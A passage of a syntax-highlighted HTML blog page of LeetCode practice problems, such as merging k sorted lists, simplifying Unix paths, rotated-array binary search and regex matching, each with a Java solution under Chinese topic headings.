class="number">0</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">      <span class="keyword">while</span> (i &lt; j || i &lt; n &amp;&amp; a[i] == <span class="string">&#x27; &#x27;</span>) i++; <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; i || j &lt; n &amp;&amp; a[j] != <span class="string">&#x27; &#x27;</span>) j++; <span class="comment">// skip non spaces</span></span><br><span class="line">      reverse(a, i, j - <span class="number">1</span>);                      <span class="comment">// reverse the word</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// trim leading, trailing and multiple spaces</span></span><br><span class="line">  String <span class="title function_">cleanSpaces</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (j &lt; n) &#123;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] == <span class="string">&#x27; &#x27;</span>) j++;             <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] != <span class="string">&#x27; &#x27;</span>) a[i++] = a[j++]; <span class="comment">// keep non spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] == <span class="string">&#x27; &#x27;</span>) j++;             <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">if</span> (j &lt; n) a[i++] = <span class="string">&#x27; &#x27;</span>;                      <span class="comment">// keep only one space</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(a).substring(<span class="number">0</span>, i);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// reverse a[] from a[i] to a[j]</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="type">char</span> <span class="variable">t</span> <span class="operator">=</span> a[i];</span><br><span class="line">      a[i++] = a[j];</span><br><span class="line">      a[j--] = t;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="merge-k-sorted-lists-">Merge k Sorted Lists -</span></h2><p>Merge <em>k</em> sorted linked lists and return it as one sorted list. Analyze and describe its complexity.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[</span><br><span class="line">  1-&gt;4-&gt;5,</span><br><span class="line">  1-&gt;3-&gt;4,</span><br><span class="line">  2-&gt;6</span><br><span class="line">]</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4-&gt;5-&gt;6</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">mergeKLists</span><span class="params">(ListNode[] lists)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(lists==<span class="literal">null</span>||lists.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        PriorityQueue&lt;ListNode&gt; q = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;ListNode&gt;(lists.length, (a,b)-&gt; a.val-b.val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode tail=dummy;</span><br><span class="line">         <span class="keyword">for</span> (ListNode node:lists)</span><br><span class="line">            <span class="keyword">if</span> (node!=<span class="literal">null</span>)</span><br><span class="line">                q.add(node);</span><br><span class="line">         <span class="keyword">while</span> (!q.isEmpty())&#123;</span><br><span class="line">            tail.next=q.poll();</span><br><span class="line">            tail=tail.next;            </span><br><span class="line">            <span class="keyword">if</span> (tail.next!=<span class="literal">null</span>)</span><br><span class="line">                q.add(tail.next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="动态规划">动态规划</span></h1><h2><span id="climbing-stairs">Climbing Stairs √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">       dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">       dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">           dp[i%<span class="number">3</span>] = dp[(i - <span class="number">1</span>)%<span class="number">3</span>] + dp[(i - <span class="number">2</span>)%<span class="number">3</span>];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> dp[n%<span class="number">3</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="栈">栈</span></h1><h2><span id="trapping-rain-water">Trapping Rain Water</span></h2><p>Given <em>n</em> non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining.</p><p><img src="https://assets.leetcode.com/uploads/2018/10/22/rainwatertrap.png" alt="img"><br>The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. <strong>Thanks Marcos</strong> for contributing this image!</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [0,1,0,2,1,0,1,3,2,1,2,1]</span><br><span class="line">Output: 6</span><br></pre></td></tr></table></figure><h2><span id="simplify-path">Simplify Path</span></h2><p>Given an <strong>absolute path</strong> for a file (Unix-style), simplify it. Or in other words, convert it to the <strong>canonical path</strong>.</p><p>In a UNIX-style file system, a period <code>.</code> refers to the current directory. Furthermore, a double period <code>..</code> moves the directory up a level.</p><p>Note that the returned canonical path must always begin with a slash <code>/</code>, and there must be only a single slash <code>/</code> between two directory names. The last directory name (if it exists) <strong>must not</strong> end with a trailing <code>/</code>. Also, the canonical path must be the <strong>shortest</strong> string representing the absolute path.</p><p> <strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/home/&quot;</span><br><span class="line">Output: &quot;/home&quot;</span><br><span class="line">Explanation: Note that there is no trailing slash after the last directory name.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/../&quot;</span><br><span class="line">Output: &quot;/&quot;</span><br><span class="line">Explanation: Going one level up from the root directory is a no-op, as the root level is the highest level you can go.</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/home//foo/&quot;</span><br><span class="line">Output: &quot;/home/foo&quot;</span><br><span class="line">Explanation: In the canonical path, multiple consecutive slashes are replaced by a single one.</span><br></pre></td></tr></table></figure><p><strong>Example 4:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/a/./b/../../c/&quot;</span><br><span class="line">Output: &quot;/c&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 5:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/a/../../b/../c//.//&quot;</span><br><span class="line">Output: &quot;/c&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 6:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;/a//b////c/d//././/..&quot;</span><br><span class="line">Output: &quot;/a/b/c&quot;</span><br></pre></td></tr></table></figure><h1><span id="二分查找">二分查找</span></h1><h2><span id="search-in-rotated-sorted-array">Search in Rotated Sorted Array √</span></h2><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p><p>(i.e., <code>[0,1,2,4,5,6,7]</code> might become <code>[4,5,6,7,0,1,2]</code>).</p><p>You are given a target value to search. If found in the array return its index, otherwise return <code>-1</code>.</p><p>You may assume no duplicate exists in the array.</p><p>Your algorithm’s runtime complexity must be in the order of <em>O</em>(log <em>n</em>).</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4,5,6,7,0,1,2], target = 0</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4,5,6,7,0,1,2], target = 3</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(nums.length==<span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">       <span class="type">int</span> lo=<span class="number">0</span>,hi=nums.length-<span class="number">1</span>,index=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(nums[lo]&lt;nums[hi]) ;</span><br><span class="line">       <span class="keyword">else</span> index=srch(nums);</span><br><span class="line">       <span class="keyword">if</span>(target&lt;=nums[hi]&amp;&amp;target&gt;=nums[index])<span class="keyword">return</span> bs(nums,index,hi,target);</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">return</span> bs(nums,lo,index-<span class="number">1</span>,target);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">bs</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi,<span class="type">int</span> target)</span>&#123;</span><br><span class="line">       <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">           <span class="type">int</span> mid=(lo+hi)/<span class="number">2</span>;</span><br><span class="line">           <span class="keyword">if</span>(a[mid]&lt;target)lo=mid+<span class="number">1</span>;</span><br><span class="line">           <span class="keyword">else</span> hi=mid;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> a[lo]==target?lo:-<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">srch</span><span class="params">(<span class="type">int</span>[] a)</span>&#123;</span><br><span class="line">       <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">           <span class="type">int</span> mid= lo +(hi-lo)/<span class="number">2</span>;</span><br><span class="line">           <span class="keyword">if</span>(a[mid]&gt;a[a.length-<span class="number">1</span>]) lo=mid+<span class="number">1</span>;</span><br><span class="line">           <span class="keyword">else</span> hi=mid;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> lo;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1><span id="双指针">双指针</span></h1><h2><span id="longest-substring-without-repeating-characters">Longest Substring Without Repeating Characters √</span></h2><p>Given a string, find the length of the <strong>longest substring</strong> without repeating characters.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;abcabcbb&quot;</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: The answer is &quot;abc&quot;, with the length of 3. </span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;bbbbb&quot;</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: The answer is &quot;b&quot;, with the length of 1.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(s.charAt(i)))&#123;</span><br><span class="line">                j=Math.max(j,map.get(s.charAt(i))+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(s.charAt(i),i);</span><br><span class="line">            res=Math.max(res,i-j+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="搜索">搜索</span></h1><h2><span id="longest-palindromic-substring">Longest Palindromic Substring ×</span></h2><p>Given a string <strong>s</strong>, find the longest palindromic substring in <strong>s</strong>. You may assume that the maximum length of <strong>s</strong> is 1000.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;babad&quot;</span><br><span class="line">Output: &quot;bab&quot;</span><br><span class="line">Note: &quot;aba&quot; is also a valid answer.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;cbbd&quot;</span><br><span class="line">Output: &quot;bb&quot;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> lo, maxLen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestPalindrome</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len-<span class="number">1</span>; i++) &#123;</span><br><span class="line">            extendPalindrome(s, i, i);  <span class="comment">//assume odd length, try to extend Palindrome as possible</span></span><br><span class="line">            extendPalindrome(s, i, i+<span class="number">1</span>); <span class="comment">//assume even length.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(lo, lo + maxLen);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">extendPalindrome</span><span class="params">(String s, <span class="type">int</span> j, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &gt;= <span class="number">0</span> &amp;&amp; k &lt; s.length() &amp;&amp; s.charAt(j) == s.charAt(k)) &#123;</span><br><span class="line">            j--;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (maxLen &lt; k - j - <span class="number">1</span>) &#123;</span><br><span class="line">            lo = j + <span class="number">1</span>;</span><br><span class="line">            maxLen = k - j - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id></span></h1><h1><span id="动态规划">动态规划</span></h1><h2><span id="maximum-subarray">Maximum Subarray √</span></h2><p>Given an integer array <code>nums</code>, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [-2,1,-3,4,-1,2,1,-5,4],</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: [4,-1,2,1] has the largest sum = 6.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">       <span class="type">int</span> res=Integer.MIN_VALUE,cur=<span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">           cur=Math.max(cur+nums[i],nums[i]);</span><br><span class="line">           res=Math.max(cur,res);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="regular-expression-matching">Regular Expression Matching √</span></h2><p>Given an input string (<code>s</code>) and a pattern (<code>p</code>), implement regular expression matching with support for <code>&#39;.&#39;</code> and <code>&#39;*&#39;</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;.&#x27; Matches any single character.</span><br><span class="line">&#x27;*&#x27; Matches zero or more of the preceding element.</span><br></pre></td></tr></table></figure><p>The matching should cover the <strong>entire</strong> input string (not partial).</p><p><strong>Note:</strong></p><ul><li><code>s</code> could be empty and contains only lowercase letters <code>a-z</code>.</li><li><code>p</code> could be empty and contains only lowercase letters <code>a-z</code>, and characters like <code>.</code> or <code>*</code>.</li></ul><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a&quot;</span><br><span class="line">Output: false</span><br><span class="line">Explanation: &quot;a&quot; does not match the entire string &quot;aa&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a*&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: &#x27;*&#x27; means zero or more of the preceding element, &#x27;a&#x27;. Therefore, by repeating &#x27;a&#x27; once, it becomes &quot;aa&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;ab&quot;</span><br><span class="line">p = &quot;.*&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: &quot;.*&quot; means &quot;zero or more (*) of any character (.)&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 4:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;aab&quot;</span><br><span class="line">p = &quot;c*a*b&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: c can be repeated 0 times, a can be repeated 1 time. Therefore, it matches &quot;aab&quot;.</span><br></pre></td></tr></table></figure><p><strong>Example 5:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;mississippi&quot;</span><br><span class="line">p = &quot;mis*is*p*.&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(String s, String p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> m=s.length(),n=p.length();</span><br><span class="line">        <span class="type">boolean</span>[][] dp=<span class="keyword">new</span> <span class="title class_">boolean</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span> cs[]=s.toCharArray(), cp[]=p.toCharArray();</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cp[i-<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)dp[<span class="number">0</span>][i]=dp[<span class="number">0</span>][i-<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(cs[i-<span class="number">1</span>]==cp[j-<span class="number">1</span>]||cp[j-<span class="number">1</span>]==<span class="string">&#x27;.&#x27;</span>) dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span>(cp[j-<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(cp[j-<span class="number">2</span>]==cs[i-<span class="number">1</span>]||cp[j-<span class="number">2</span>]==<span class="string">&#x27;.&#x27;</span>) dp[i][j]|=dp[i-<span class="number">1</span>][j]||dp[i][j-<span class="number">1</span>]||dp[i][j-<span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">else</span> dp[i][j]=dp[i][j-<span class="number">2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="排序">排序</span></h1><h2><span id="kth-largest-element-in-an-array">Kth Largest Element in an Array √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findKthLargest</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(k&lt;=<span class="number">0</span>||k&gt;nums.length) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        qs(nums,nums.length-k);</span><br><span class="line">        <span class="keyword">return</span> nums[nums.length-k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">qs</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> k)</span>&#123;</span><br><span class="line">        <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> select(a,lo,hi);</span><br><span class="line">            <span class="keyword">if</span>(k==mid) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(k&gt;mid) lo=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> hi=mid-<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i=lo,j=hi,x=a[lo];</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x) j--;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x) i++;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;j) a[j]=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        a[i]=x;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="数字">数字</span></h1><h2><span id="reverse-integer">Reverse Integer √</span></h2><p>Given a 32-bit signed integer, reverse digits of an integer.</p><p><strong>Example 